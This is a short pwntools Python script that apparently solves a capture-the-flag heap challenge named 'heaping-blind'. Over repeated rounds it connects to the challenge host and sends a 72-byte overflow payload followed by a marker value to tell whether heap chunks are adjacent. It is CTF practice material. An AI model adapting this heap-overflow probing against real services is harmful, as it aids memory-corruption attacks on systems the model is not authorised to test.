from pwn import *

host = "heaping-blind.rumble.host"
if args.LOCAL:
    io = process("./heaping-blind-0-easy")
    if args.GDB:
        cmd="""
        """
        gdb.attach(io, cmd)
else:
    io = remote(host, 13360)

def write_message(p, message):
    p.sendlineafter(b'> ', b"1")
    p.sendlineafter(b' short message: ', message)
def write_long(p, message):
    p.sendlineafter(b'> ', b"2")
    p.sendlineafter(b'ong message: ',message)
def send_message(p, idx):
    p.sendlineafter(b'> ', b"3")
    p.sendlineafter(b' the message: ', str(idx).encode())
    
def submit(p, choice):
    p.sendlineafter(b'> ',b"4")
    p.sendlineafter(b'ks adjacent?', str(choice).encode())
i = 0
while i <= 33:    
    log.info('Round ' + str(i))
    io.recvuntil(b'listening on port ')

    port = int(io.recvline().strip(b'\n'))      
    print(port)

    p = remote(host, port)

    send_message(p, 0)
    send_message(p, 1)

    write_message(p, b'A'*20)
    write_message(p, b'A'*72+p64(0xdeadbeef))
    send_message(p, 0)
    
    try:
        submit(p, 0)
    except EOFError:
        p.close()
        p = remote(host, port)
        submit(p, 1)
        pass
    if i == 32: print(p.recvline())
    i+=1
    

io.interactive()

